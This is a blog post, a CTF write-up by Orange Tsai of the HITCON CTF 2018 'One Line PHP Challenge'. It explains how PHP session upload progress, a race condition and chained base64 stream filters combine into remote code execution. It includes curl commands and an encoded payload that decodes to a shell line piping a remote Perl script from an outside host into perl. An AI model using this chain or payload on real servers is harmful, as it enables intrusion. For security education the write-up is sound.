@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="In every year’s HITCON CTF, I will prepare at least one PHP exploit challenge which the source code is very straightforward, short and easy to review but hard to exploit! I have put all my challenges">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HITCON CTF 2018 - One Line PHP Challenge">
+<meta property="og:url" content="http://blog.orange.tw/posts/2018-10-hitcon-ctf-2018-one-line-php-challenge/index.html">
+<meta property="og:site_name" content="Orange Tsai">
+<meta property="og:description" content="In every year’s HITCON CTF, I will prepare at least one PHP exploit challenge which the source code is very straightforward, short and easy to review but hard to exploit! I have put all my challenges">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://blog.orange.tw/posts/2018-10-hitcon-ctf-2018-one-line-php-challenge/e8d96ba6490e70eb-01.png">
+<meta property="og:image" content="http://blog.orange.tw/posts/2018-10-hitcon-ctf-2018-one-line-php-challenge/acfdf82f194b711a-02.png">
+<meta property="og:image" content="http://blog.orange.tw/posts/2018-10-hitcon-ctf-2018-one-line-php-challenge/b881c032b8eb0dbe-03.png">
+<meta property="article:published_time" content="2018-10-23T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-08-21T06:22:54.659Z">
+<meta property="article:author" content="Orange Tsai">
+<meta property="article:tag" content="Hacker, Security, Vulnerability, Web, RCE, SSRF, XSS, CVE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://blog.orange.tw/posts/2018-10-hitcon-ctf-2018-one-line-php-challenge/e8d96ba6490e70eb-01.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    
+      <title>HITCON CTF 2018 - One Line PHP Challenge | Orange Tsai</title>
+    
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-13047966-1"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'UA-13047966-1');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="Orange Tsai" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+    <div class="content index py4 ">
+        
+          <header id="header">
+  <a class="u-url u-uid" href="/">
+  
+    
+      <img id="logo" alt class="u-logo" src="/images/logo.png" />
+    
+  
+    <div id="title">
+      <h1 class="p-name">Orange Tsai</h1>
+    </div>
+  </a>
+  <div id="nav">
+    <ul>
+      <li class="icon">
+        <a href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-2x"></i></a>
+      </li>
+      <!--
+     --><li><a href="/">Home</a></li><!--
+   --><!--
+     --><li><a href="/articles/">Articles</a></li><!--
+   --><!--
+     --><li><a href="/talks/">Talks</a></li><!--
+   --><!--
+     --><li><a href="/about/">About</a></li><!--
+   -->
+    </ul>
+  </div>
+</header>
+
+        
+
+        
+          <hr style='margin: 0px; margin-bottom: 32px; border: 0.5px solid #ccc; '>
+        
+
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HITCON CTF 2018 - One Line PHP Challenge
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">🍊 <a href='/about'>Orange Tsai</a></span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2018-10-23T16:00:00.000Z" class="dt-published" itemprop="datePublished">2018-10-24</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>In every year’s HITCON CTF, I will prepare at least one PHP exploit challenge which the source code is very straightforward, short and easy to review but hard to exploit! I have put all my challenges in this <a target="_blank" rel="noopener" href="https://github.com/orangetw/My-CTF-Web-Challenges">GitHub repo</a> you can check, and here are some lists :P  </p>
+<ul>
+<li>2017 <a target="_blank" rel="noopener" href="https://github.com/orangetw/My-CTF-Web-Challenges#babyh-master-php-2017">Baby^H Master PHP 2017</a> (0&#x2F;1541 solved)<ul>
+<li><code>Phar</code> protocol to <code>deserialize</code> malicious object</li>
+<li>Hardcode anonymous function name <code>\x00lambda_%d</code></li>
+<li>Break shared VARIABLE state in Apache Pre-fork mode</li>
+</ul>
+</li>
+<li>2017 <a target="_blank" rel="noopener" href="https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge-v2">BabyFirst Revenge v2</a> (8&#x2F;1541 solved)<ul>
+<li>Command Injection in <strong>4</strong> bytes</li>
+</ul>
+</li>
+<li>2016 <a target="_blank" rel="noopener" href="https://github.com/orangetw/My-CTF-Web-Challenges#babytrick">BabyTrick</a> (24&#x2F;1024 solved)<ul>
+<li><a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=72663">Create an Unexpected Object and Don’t Invoke __wakeup() in Deserialization</a></li>
+<li>MySQL UTF-8 collation - <code>SELECT &#39;Ä&#39;=&#39;a&#39;</code> is True</li>
+</ul>
+</li>
+<li>2015 <a target="_blank" rel="noopener" href="https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst">Babyfirst</a> (33&#x2F;969 solved)<ul>
+<li>Multi-line match in PHP regular expression</li>
+<li>Command injection without symbols</li>
+</ul>
+</li>
+<li>2015 <a target="_blank" rel="noopener" href="https://github.com/orangetw/My-CTF-Web-Challenges#use-after-flee">Use-After-FLEE</a> (1&#x2F;969 solved)<ul>
+<li>Bypass disable_functions and open_basedir</li>
+<li>Write PHP use-after-free exploit</li>
+<li>Bypass full protection (DEP &#x2F; ASLR &#x2F; PIE &#x2F; FULL RELRO)</li>
+<li><a target="_blank" rel="noopener" href="https://github.com/80vul/phpcodz/blob/master/research/pch-034.md">Yet Another Use After Free Vulnerability in unserialize() with SplDoublyLinkedList</a></li>
+</ul>
+</li>
+</ul>
+<p>This year, I designed another one and it’s the shortest one among all my challenges - One Line PHP Challenge!(There is also another PHP code review challenges called <a target="_blank" rel="noopener" href="https://github.com/orangetw/My-CTF-Web-Challenges#baby-cake">Baby Cake</a> may be you will be interested!) It’s only 3 teams(among all 1816 teams)solve that during the competition. This challenge demonstrates how PHP can be squeezed. The initial idea is from <a target="_blank" rel="noopener" href="https://twitter.com/chtg57">@chtg57</a>‘s <a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=72681">PHP bug report</a>. Since <code>session.upload_progress</code> is default enabled in PHP so that you can control partial content in PHP SESSION files! Start from this feature, I designed this challenge!  </p>
+<p>The challenge is simple, just one line and tell you it is running under default installation of Ubuntu 18.04 + PHP7.2 + Apache. Here is whole the source code:  </p>
+<p><img src="/posts/2018-10-hitcon-ctf-2018-one-line-php-challenge/e8d96ba6490e70eb-01.png">  </p>
+<p>With the upload progress feature, although you can control the partial content in SESSION file, there are still several parts you need to defeat!  </p>
+<h2 id="Inclusion-Tragedy"><a href="#Inclusion-Tragedy" class="headerlink" title="Inclusion Tragedy"></a>Inclusion Tragedy</h2><p>In modern PHP configuration, the <code>allow_url_include</code> is always <code>Off</code> so the <code>RFI(Remote file inclusion)</code> is impossible, and due to the harden of new version’s Apache and PHP, it can not also include the common path in LFI exploiting such as <code>/proc/self/environs</code> or <code>/var/log/apache2/access.log</code>.  </p>
+<p>There is also no place can leak the PHP upload temporary filename so the <a target="_blank" rel="noopener" href="https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf">LFI WITH PHPINFO() ASSISTANCE</a> is also impossible :(  </p>
+<h2 id="Session-Tragedy"><a href="#Session-Tragedy" class="headerlink" title="Session Tragedy"></a>Session Tragedy</h2><p>The PHP check the value <code>session.auto_start</code> or function <code>session_start()</code> to know whether it need to process session on current request or not. Unfortunately, the default value of <code>session.auto_start</code> is <code>Off</code>. However, it’s interesting that if you provide the <code>PHP_SESSION_UPLOAD_PROGRESS</code> in multipart POST data. The PHP will enable the session for you :P  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://127.0.0.1/ -H <span class="string">&#x27;Cookie: PHPSESSID=iamorange&#x27;</span></span><br><span class="line">$ <span class="built_in">ls</span> -a /var/lib/php/sessions/</span><br><span class="line">. ..</span><br><span class="line">$ curl http://127.0.0.1/ -H <span class="string">&#x27;Cookie: PHPSESSID=iamorange&#x27;</span> -d <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS=blahblahblah&#x27;</span></span><br><span class="line">$ <span class="built_in">ls</span> -a /var/lib/php/sessions/</span><br><span class="line">. ..</span><br><span class="line">$ curl http://127.0.0.1/ -H <span class="string">&#x27;Cookie: PHPSESSID=iamorange&#x27;</span> -F <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS=blahblahblah&#x27;</span>  -F <span class="string">&#x27;file=@/etc/passwd&#x27;</span></span><br><span class="line">$ <span class="built_in">ls</span> -a /var/lib/php/sessions/</span><br><span class="line">. .. sess_iamorange</span><br></pre></td></tr></table></figure>
+
+<h2 id="Cleanup-Tragedy"><a href="#Cleanup-Tragedy" class="headerlink" title="Cleanup Tragedy"></a>Cleanup Tragedy</h2><p>Although most tutorials on the Internet recommends you to set <code>session.upload_progress.cleanup</code> to <code>Off</code> for debugging purpose. The default <code>session.upload_progress.cleanup</code> in PHP is still <code>On</code>. It means your upload progress in the session will be cleaned as soon as possible!  </p>
+<p>Here we use race condition to catch our data! (Another idea is uploading a large file to keep the progress)  </p>
+<h2 id="Prefix-Tragedy"><a href="#Prefix-Tragedy" class="headerlink" title="Prefix Tragedy"></a>Prefix Tragedy</h2><p>OK, now we can control some data in remote server, but the last tragedy is the prefix. Due to the default setting of <code>session.upload_progress.prefix</code>, our SESSION file will start with a annoying prefix <code>upload_progress_</code>! Such as:  </p>
+<p><img src="/posts/2018-10-hitcon-ctf-2018-one-line-php-challenge/acfdf82f194b711a-02.png">  </p>
+<p>In order to match the <code>@&lt;?php</code>. Here we combine multiple PHP stream filter to bypass that annoying prefix. Such as:  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/[FILTER_A]/.../resource=/var/lib/php/session/sess...</span><br></pre></td></tr></table></figure>
+
+
+<p>In PHP, the <code>base64</code> will ignore invalid characters. So we combine multiple <code>convert.base64-decode</code> filter to that, for the payload <code>VVVSM0wyTkhhSGRKUjBKcVpGaEtjMGxIT1hsWlZ6VnVXbE0xTUdSNU9UTk1Na3BxVEc1Q2MyWklRbXhqYlhkblRGZEJOMUI2TkhaTWVUaDJUSGs0ZGt4NU9IWk1lVGgy</code>. The SESSION file looks like:  </p>
+<p><img src="/posts/2018-10-hitcon-ctf-2018-one-line-php-challenge/b881c032b8eb0dbe-03.png">  </p>
+<p><em>P.S. We add <code>ZZ</code> as padding to fit the previous garbage</em></p>
+<p>After the the first <code>convert.base64-decode</code> the payload will look like:  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">��hi�k� ޲�YUUR3L2NHaHdJR0JqZFhKc0lHOXlZVzVuWlM1MGR5OTNMMkpqTG5Cc2ZIQmxjbXdnTFdBN1B6NHZMeTh2THk4dkx5OHZMeTh2</span><br></pre></td></tr></table></figure>
+
+
+
+<p>The second times, PHP will decode the <code>hikYUU...</code> as:  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">�) QDw/cGhwIGBjdXJsIG9yYW5nZS50dy93L2JjLnBsfHBlcmwgLWA7Pz4vLy8vLy8vLy8vLy8v</span><br></pre></td></tr></table></figure>
+
+
+
+<p>The third <code>convert.base64-decode</code>, it becomes to our shell payload:  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@&lt;?php `curl orange.tw/w/bc.pl|perl -`;?&gt;/////////////</span><br></pre></td></tr></table></figure>
+
+
+
+
+<p>OK, by chaining above techniques(session upload progress + race condition + PHP wrappers), we can get the shell back! Please <a target="_blank" rel="noopener" href="https://github.com/orangetw/My-CTF-Web-Challenges/blob/master/hitcon-ctf-2018/one-line-php-challenge/exp_for_php.py">check here</a> for the final exploit!</p>
+
+  </div>
+</article>
+
+
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2009-2024
+    Orange Tsai
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/articles/">Articles</a></li><!--
+     --><!--
+       --><li><a href="/talks/">Talks</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
